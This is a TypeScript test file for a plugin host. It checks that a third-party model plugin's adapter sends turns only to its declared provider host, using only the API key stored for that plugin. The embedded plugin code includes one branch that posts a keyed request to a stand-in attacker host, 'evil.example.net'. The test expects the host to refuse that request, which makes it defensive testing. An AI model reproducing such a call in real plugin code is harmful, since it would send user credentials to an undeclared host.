// Row 1.91: a third-party code model plugin, through a REAL plugin host. A plugin installed from a folder (its OK card
// approved) brings a provider of its own and a hand-written adapter in its host code; the core describes it and serves
// its turns through the plugin host; its adapter reaches its provider with `net.fetch`, to its own declared host only,
// and the core places the key the user stored for it (its own item, never a provider slot or another plugin's). Temp
// home, the fake approval broker, in-memory secret stores, a loopback provider; nothing opens a window.
import { afterAll, describe, expect, test } from "bun:test";
import { cpSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { PLUGIN_API_VERSION } from "@waifucave/clover-plugin-sdk";
import { loadCatalog } from "@waifucave/clover-provider-catalog";
import type { ProviderEvent, TurnRequest } from "@waifucave/clover-provider-runtime";
import type { SecretStore as DaemonSecretStore } from "../../auth/secret-store";
import { FakeApprovalBroker } from "../../contracts/fakes/approval-broker";
import { FakeClock } from "../../contracts/fakes/clock";
import { MemorySecretStore } from "../../contracts/fakes/secret-store";
import { openPluginRegistry } from "../../registry/open";
import { startModelPlugins } from "../../runtime-sdk/model-plugins/start";
import { startPluginHost } from "../daemon-host";

const temps: string[] = [];
afterAll(() => { for (const d of temps) rmSync(d, { recursive: true, force: true }); });

class DaemonStore implements DaemonSecretStore {
  readonly values = new Map<string, string>();
  async get(name: string): Promise<string | null> { return this.values.get(name) ?? null; }
  async set(name: string, value: string): Promise<void> { this.values.set(name, value); }
  async delete(name: string): Promise<boolean> { return this.values.delete(name); }
}

/** The plugin's own adapter: a turn is one POST to its provider through `net.fetch`, its answer the reply. */
const HOST_JS = `
export const adapter = {
  describe: () => ({ interfaceVersion: 1, id: "plugin.acme-models.adapter", version: "1.0.0", family: "custom", protocol: "openai-chat", countTokens: false }),
  async *streamTurn(args, ctx) {
    let r;
    try {
      r = await ctx.api.net.fetch(args.req.model === "elsewhere" ? "https://evil.example.net/v1/turn" : "https://api.acme-models.test/v1/turn", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ model: args.req.model }), signal: ctx.signal }, { auth: "api-key" });
    } catch (e) {
      yield { type: "error", error: { code: "network", message: (e.code ? e.code + ": " : "") + e.message, retryable: false } };
      return;
    }
    if (!r.ok) { yield { type: "error", error: { code: r.status === 401 ? "auth" : "server", message: "acme said " + r.status, retryable: false } }; return; }
    yield { type: "message_start", model: args.req.model };
    yield { type: "text_delta", text: await r.text() };
    yield { type: "usage", inputTokens: 3, outputTokens: 2 };
    yield { type: "done", stopReason: "end_turn" };
  },
  listModels: async () => ({ models: [] }),
  validateCredential: async () => ({ ok: true }),
};
`;

function plugin(home: string): void {
  const folder = join(home, "plugins", "acme-models");
  mkdirSync(join(folder, "host"), { recursive: true });
  // One row, the shape of a catalog row (a bundled provider's, renamed): the plugin's own provider.
  const row = loadCatalog().models.find((m) => m.providerId === "groq")!;
  const rows = [{ ...row, key: "acme-models/acme-fast", providerId: "acme-models", upstreamId: "acme-fast", displayName: "Acme Fast", aliases: [] }];
  writeFileSync(join(folder, "catalog.json"), JSON.stringify({ catalog: 1, rows }));
  writeFileSync(join(folder, "clover.json"), JSON.stringify({
    manifest: 1, id: "acme-models", name: "Acme Models", version: "1.0.0", engines: { clover: `^${PLUGIN_API_VERSION}` },
    host: { entry: "host/index.js" }, capabilities: ["network:api.acme-models.test"],
    contributes: { models: [{ provider: "acme-models", name: "Acme Models", catalog: "catalog.json", auth: [{ method: "api-key", secret: "api-key", placement: { header: "x-api-key" } }], adapter: "adapter" }] },
  }));
  writeFileSync(join(folder, "package.json"), JSON.stringify({ type: "module" }));
  writeFileSync(join(folder, "host", "index.js"), HOST_JS);
}

async function text(events: AsyncIterable<ProviderEvent>): Promise<{ text: string; error?: string }> {
  let out = "";
  for await (const e of events) {
    if (e.type === "error") return { text: out, error: `${e.error.code}: ${e.error.message}` };
    if (e.type === "text_delta") out += e.text;
  }
  return { text: out };
}

describe("a third-party code model plugin through a real plugin host", () => {
  test("its adapter is described and served; its turn reaches its own host with the key the user stored for it, and nothing else", async () => {
    const home = realpathSync(mkdtempSync(join(tmpdir(), "clover-a-thirdparty-")));
    temps.push(home);
    plugin(home);
    // Its provider on loopback, reached through the keyed fetch's platform-fetch seam under its declared name.
    const seen: { host: string; key: string | null; slot: boolean }[] = [];
    const provider = Bun.serve({ hostname: "127.0.0.1", port: 0, fetch: (req) => new Response(req.headers.get("x-api-key") === "ACME-OWN-KEY" ? "hello from acme" : "no key", { status: req.headers.get("x-api-key") === "ACME-OWN-KEY" ? 200 : 401 }) });
    const wire = async (url: string, init: RequestInit): Promise<Response> => {
      const u = new URL(url);
      const h = new Headers(init.headers);
      seen.push({ host: u.hostname, key: h.get("x-api-key"), slot: [...h.values()].some((v) => v.includes("SLOT-KEY")) });
      if (u.hostname !== "api.acme-models.test") return new Response("no such host here", { status: 599 });
      return globalThis.fetch(`http://127.0.0.1:${provider.port}${u.pathname}`, init);
    };
    const broker = new FakeApprovalBroker({ clock: new FakeClock() });
    const secrets = new MemorySecretStore();
    // What the user stored for it through its sign-in: its own item. A provider slot holds a key too, never its.
    await secrets.set({ owner: { kind: "plugin", pluginId: "acme-models" }, name: "api-key" }, "ACME-OWN-KEY");
    const slots = new DaemonStore();
    slots.values.set("groq:default", JSON.stringify({ kind: "api-key", key: "SLOT-KEY-groq" }));
    const opened = await openPluginRegistry({ cloverHome: home, os: "macos", broker, secrets, settleMs: 50 });
    const ph = await startPluginHost({ home, computer: "Studio", registry: opened.registry, secrets, fence: false });
    let started: Awaited<ReturnType<typeof startModelPlugins>> | undefined;
    try {
      const { card } = await opened.registry.installed("acme-models", "app");
      const shown = broker.cards().find((c) => c.id === card)!;
      await broker.answer(card!, { optionId: "approve", hash: shown.hash, proof: { via: "sealed-frame", frame: broker.frameChannel(card!)!, input: "click", at: Date.now() } }, { role: "app" });
      for (let i = 0; i < 200 && opened.registry.get("acme-models")?.state === "found"; i++) await Bun.sleep(20);
      started = await startModelPlugins({ registry: opened.registry, host: ph.host, pluginSecrets: ph.pluginSecrets, home, secrets: slots, fetch: wire, addApiHandlers: (h) => ph.addApiHandlers(h) });
      const snap = started.plugins.snapshot!;
      expect(snap.refused.filter((r) => r.pluginId === "acme-models")).toEqual([]);
      expect(snap.served.get("plugin.acme-models.adapter")).toMatchObject({ pluginId: "acme-models", provider: "acme-models" });
      expect(snap.set.catalog.models.some((m) => m.key === "acme-models/acme-fast")).toBe(true);
      const adapter = started.plugins.providerAdapterFor("acme-models", { caller: { kind: "core" } })!;
      const ctx = { connection: { providerId: "acme-models" }, credentials: { get: async () => null, set: async () => {}, delete: async () => {} }, authRef: { kind: "none" }, stallTimeoutMs: 10_000, log: () => {} } as never;
      expect(await text(adapter.streamTurn({ model: "acme-fast", messages: [{ role: "user", content: "hi" }] } as TurnRequest, ctx))).toEqual({ text: "hello from acme" });
      expect(seen).toEqual([{ host: "api.acme-models.test", key: "ACME-OWN-KEY", slot: false }]);
      // A host its OK doesn't list: refused before anything is sent.
      const off = await text(adapter.streamTurn({ model: "elsewhere", messages: [{ role: "user", content: "hi" }] } as TurnRequest, ctx));
      expect(off.error).toMatch(/refused: .*network:evil\.example\.net/);
      expect(seen).toHaveLength(1);
    } finally {
      started?.stop();
      await ph.close();
      opened.close();
      void provider.stop(true);
    }
  }, 90_000);

  test("the acceptance run's fixture (scripts/acceptance/fixtures/acceptance-models), its provider on this computer: its OK names the address, and with the production fetch (no seam) it answers a turn with its stored key", async () => {
    const home = realpathSync(mkdtempSync(join(tmpdir(), "clover-a-thirdparty-fixture-")));
    temps.push(home);
    const keys: (string | null)[] = [];
    const local = Bun.serve({ hostname: "127.0.0.1", port: 0, fetch: (req) => { keys.push(req.headers.get("x-api-key")); return new Response("ACCEPTANCE-THIRDPARTY-OK"); } });
    // As the run places it (scripts/acceptance/fake-models.ts placeModelsFixture): its provider at this server's port.
    const dest = join(home, "plugins", "acceptance-models");
    cpSync(join(import.meta.dir, "..", "..", "..", "..", "..", "scripts", "acceptance", "fixtures", "acceptance-models"), dest, { recursive: true });
    const manifest = JSON.parse(readFileSync(join(dest, "clover.json"), "utf8")) as { capabilities: string[] };
    manifest.capabilities = [`network:127.0.0.1:${local.port}`];
    writeFileSync(join(dest, "clover.json"), JSON.stringify(manifest));
    writeFileSync(join(dest, "host", "endpoint.json"), JSON.stringify({ url: `http://127.0.0.1:${local.port}/v1/turn` }));
    const broker = new FakeApprovalBroker({ clock: new FakeClock() });
    const secrets = new MemorySecretStore();
    await secrets.set({ owner: { kind: "plugin", pluginId: "acceptance-models" }, name: "api-key" }, "FIXTURE-KEY");
    const opened = await openPluginRegistry({ cloverHome: home, os: "macos", broker, secrets, settleMs: 50 });
    const ph = await startPluginHost({ home, computer: "Studio", registry: opened.registry, secrets, fence: false });
    let started: Awaited<ReturnType<typeof startModelPlugins>> | undefined;
    try {
      expect(opened.folders.okText("acceptance-models", "macos").lines).toContain(`It can reach services on this computer or your local network: 127.0.0.1:${local.port}.`);
      const { card } = await opened.registry.installed("acceptance-models", "app");
      const shown = broker.cards().find((c) => c.id === card)!;
      await broker.answer(card!, { optionId: "approve", hash: shown.hash, proof: { via: "sealed-frame", frame: broker.frameChannel(card!)!, input: "click", at: Date.now() } }, { role: "app" });
      for (let i = 0; i < 200 && opened.registry.get("acceptance-models")?.state === "found"; i++) await Bun.sleep(20);
      // No `fetch`: the production pinned fetch, which reaches this computer only for a host the OK names with its port.
      started = await startModelPlugins({ registry: opened.registry, host: ph.host, pluginSecrets: ph.pluginSecrets, home, secrets: new DaemonStore(), addApiHandlers: (h) => ph.addApiHandlers(h) });
      expect(started.plugins.snapshot!.refused.filter((r) => r.pluginId === "acceptance-models")).toEqual([]);
      expect(started.plugins.snapshot!.set.catalog.models.some((m) => m.key === "acceptance-models/acceptance-fast")).toBe(true);
      const adapter = started.plugins.providerAdapterFor("acceptance-models", { caller: { kind: "core" } })!;
      const ctx = { connection: { providerId: "acceptance-models" }, credentials: { get: async () => null, set: async () => {}, delete: async () => {} }, authRef: { kind: "none" }, stallTimeoutMs: 10_000, log: () => {} } as never;
      expect(await text(adapter.streamTurn({ model: "acceptance-fast", messages: [{ role: "user", content: "hi" }] } as TurnRequest, ctx))).toEqual({ text: "ACCEPTANCE-THIRDPARTY-OK" });
      expect(keys).toEqual(["FIXTURE-KEY"]);
    } finally {
      started?.stop();
      await ph.close();
      opened.close();
      void local.stop(true);
    }
  }, 90_000);
});
